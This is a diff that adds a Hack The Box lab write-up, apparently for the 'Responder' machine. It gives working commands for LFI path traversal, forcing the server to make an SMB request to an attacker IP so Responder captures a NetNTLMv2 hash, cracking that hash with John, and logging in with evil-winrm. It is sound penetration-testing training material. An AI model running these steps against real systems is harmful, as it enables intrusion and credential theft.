@@ -1,1 +1,58 @@
 https://labs.hackthebox.com/achievement/machine/3142066/461    (achievment) 
+
+
+Executive Summary
+
+During the security assessment of the target host 10.129.159.223, a critical Local File Inclusion (LFI) vulnerability was discovered in the PHP-based web application running on port 80. By exploiting this vulnerability alongside a misconfiguration in how Windows handles SMB authentication requests, administrative credentials were recovered. Full system compromise was achieved via Windows Remote Management (WinRM), allowing for unauthenticated access to user data.
+Technical Breakdown & Attack Lifecycle
+Phase 1: Reconnaissance & Virtual Host Mapping
+
+An initial Nmap scan revealed two primary open ports:
+
+    Port 80 (HTTP): Running an Apache web server.
+
+    Port 5985 (WinRM): Windows Remote Management.
+
+Directly navigating to the IP address via a web browser failed because the server uses Name-Based Virtual Hosting. The server requires the correct HTTP Host header to route traffic. To fix this, the domain mapping was added locally to /etc/hosts:
+Bash
+
+echo "10.129.159.223 unika.htb" | sudo tee -a /etc/hosts
+
+Phase 2: Vulnerability Identification (LFI)
+
+Navigating to http://unika.htb revealed a language selection parameter (?page=french.html). Testing this parameter with directory traversal characters (../) confirmed a Local File Inclusion (LFI) vulnerability by successfully reading the internal Windows hosts file:
+Plaintext
+
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+Phase 3: Exploitation (Credential Harvesting via SMB)
+
+While the PHP configuration (php.ini) disabled loading remote files via HTTP/FTP links, it did not restrict the loading of SMB network paths.
+
+    A local LLMNR/NBNS/SMB poisoner tool (Responder) was started on the VPN interface to listen for authentication requests:
+    Bash
+
+    sudo responder -I tun0 -wF
+
+    The web application was forced to include a fake file from the attacker's machine over the SMB protocol:
+    Plaintext
+
+    http://unika.htb/index.php?page=//10.10.14.81/somefile
+
+    The Windows server automatically attempted to authenticate against the attacker's machine to access the fake share, leaking the NetNTLMv2 hash for the local Administrator account to Responder.
+
+Phase 4: Password Cracking
+
+The captured hash was isolated into a text file and cracked using John the Ripper against the rockyou.txt wordlist:
+Bash
+
+john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
+
+    Resulting Password: badminton
+
+Phase 5: Post-Exploitation & Compromise
+
+Using the recovered administrative credentials, a remote PowerShell session was successfully established via WinRM using the evil-winrm utility:
+Bash
+
+evil-winrm -i 10.129.159.223 -u administrator -p badminton
